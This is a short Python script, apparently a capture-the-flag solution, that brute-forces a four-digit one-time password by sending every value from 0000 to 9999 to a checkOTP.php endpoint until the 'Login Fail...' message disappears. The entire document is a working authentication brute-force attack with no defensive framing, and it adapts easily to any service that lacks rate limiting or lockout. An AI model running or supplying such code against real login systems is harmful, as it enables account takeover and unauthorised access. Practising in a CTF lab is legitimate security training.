import requests

for i in range(10000):
    num = str(i).zfill(4)

    print(f"num: {num}", end="\r")

    response = requests.get(f"http://ctf.segfaulthub.com:1129/6/checkOTP.php?otpNum={num}")

    if "Login Fail..." not in response.text:
        print(f"key otpnum: {num}")
        break